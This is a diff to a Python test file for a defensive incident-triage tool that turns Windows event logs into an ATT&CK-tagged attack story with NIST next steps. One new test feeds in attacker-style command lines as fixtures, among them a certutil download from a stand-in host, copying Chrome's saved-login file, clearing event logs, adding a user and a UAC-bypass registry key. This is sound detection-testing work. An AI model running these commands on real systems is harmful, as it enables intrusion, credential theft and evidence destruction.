@@ -5,8 +5,8 @@ from triage import story
 from triage.checks import make_verdict, run_checks
 
 # The MITRE ATT&CK tactics the story may use.
-TACTICS = ["Initial Access", "Execution", "Persistence", "Defense Evasion", "Credential Access",
-           "Discovery", "Command and Control", "Impact"]
+TACTICS = ["Initial Access", "Execution", "Persistence", "Privilege Escalation", "Defense Evasion",
+           "Credential Access", "Discovery", "Lateral Movement", "Command and Control", "Impact"]
 
 
 def steps_of(events):
@@ -141,6 +141,44 @@ def test_page_shows_real_addresses_as_code_text():
     assert story.code_addresses("version 10.0.22621.1") == "version 10.0.22621.1"
 
 
+def test_every_check_has_a_tag_a_sentence_and_next_steps():
+    for check in story.ATTACK_TAGS:
+        assert story.ATTACK_TAGS[check][0] in TACTICS, check
+        assert check in story.SENTENCES, check
+    from triage.checks import ALL_CHECKS
+    for function in ALL_CHECKS:  # check_recon_burst -> "recon_burst"
+        assert function.__name__.removeprefix("check_") in story.ACTIONS, function.__name__
+
+
+def test_new_checks_become_story_steps():
+    sys32 = "C:\\Windows\\System32\\"
+    tool = USER + "\\AppData\\Roaming\\x\\tool.exe"
+    commands = [(sys32 + "wbem\\WMIC.exe", 'wmic /node:SRV-01 process call create "cmd"'),
+                (sys32 + "net.exe", "net user helpdesk **** /add"),
+                (sys32 + "schtasks.exe", "schtasks /create /tn T /tr C:\\x.exe /sc daily"),
+                (sys32 + "certutil.exe", "certutil -urlcache -split -f http://x.example/a a"),
+                (sys32 + "rundll32.exe", f"rundll32.exe {USER}\\AppData\\Roaming\\x\\a.dll,Start"),
+                (sys32 + "esentutl.exe", f'esentutl /y "{USER}\\AppData\\Local\\Google\\Chrome\\User Data\\'
+                                         f'Default\\Login Data" /d C:\\ld'),
+                (sys32 + "wevtutil.exe", "wevtutil cl System")]
+    events = [event(n, 1, f"2026-01-05 10:00:{n:02d}.000", ProcessGuid=f"{{c{n}}}", ParentProcessGuid="{tool}",
+                    Image=image, ParentImage=tool, CommandLine=command)
+              for n, (image, command) in enumerate(commands, start=1)]
+    events.append(event(20, 13, "2026-01-05 10:00:20.000", ProcessGuid="{tool}", Image=tool,
+                        TargetObject="HKU\\S-1-5-21-0_Classes\\Software\\Classes\\ms-settings\\shell\\open\\command",
+                        Details="C:\\x.exe"))
+    findings = run_checks(events)
+    steps = story.build_steps(events, findings)
+    told = {s.get("check") for s in steps}  # the delivery step comes from the story, not a check
+    for check in ["remote_execution", "access_change", "scheduled_task", "tool_download", "dll_from_user_folder",
+                  "credential_theft", "evidence_removal", "uac_bypass"]:
+        assert check in told, check
+    assert all(s["tactic"] in TACTICS and s["technique"] for s in steps if s["kind"] == "finding")
+    plan = story.next_steps(findings, make_verdict(findings), steps)
+    assert any("Reset the passwords" in item for item in plan["Contain"])
+    assert make_verdict(findings)["label"] == "Malicious"
+
+
 def test_next_steps_use_nist_phases():
     events = attack_events()
     findings = run_checks(events)
@@ -163,5 +201,5 @@ def test_download_site_host_without_a_path():
 def test_benign_next_steps_are_investigate_only():
     plan = story.next_steps([], make_verdict([]))
     assert list(plan) == ["Investigate"]
-    assert plan["Investigate"][0].startswith("Nothing known-bad was found by the 10 checks; "
+    assert plan["Investigate"][0].startswith("Nothing known-bad was found by the checks; "
                                              "this does not prove the computer is clean.")
